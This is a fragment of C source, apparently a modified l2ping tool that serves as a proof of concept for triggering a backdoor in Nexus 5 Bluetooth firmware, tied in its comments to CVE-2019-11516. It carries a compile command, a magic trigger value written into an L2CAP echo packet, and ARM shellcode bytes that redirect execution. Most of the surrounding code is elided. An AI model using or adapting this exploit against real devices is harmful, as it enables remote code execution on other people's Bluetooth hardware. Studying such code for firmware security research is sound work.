/*
Modified version to trigger the backdoor for the Nexus 5 EIR exploit.
Changes start at line 161
Compile with gcc -o l2ping l2ping_cve_2019_11516_backdoor_trigger.c -lbluetooth
*/
/*
 *
...
static void ping(char *svr)
{
	...
	while (count == -1 || count-- > 0) {
        ...
        //Our modifications to trigger the backdoor
        *(uint32_t*)(send_buf + L2CAP_CMD_HDR_SIZE) = 0xdeadc0de; //Trigger backdoor
        //ldr.w lr, [pc, #4]
        //ldr.w pc, [pc, #0]
        //0xdeadbeef
        #define shellcode "\xdf\xf8\x04\xe0\xdf\xf8\x00\xf0\xef\xbe\xad\xde"
        memcpy(send_buf + L2CAP_CMD_HDR_SIZE + 4, shellcode, sizeof(shellcode));
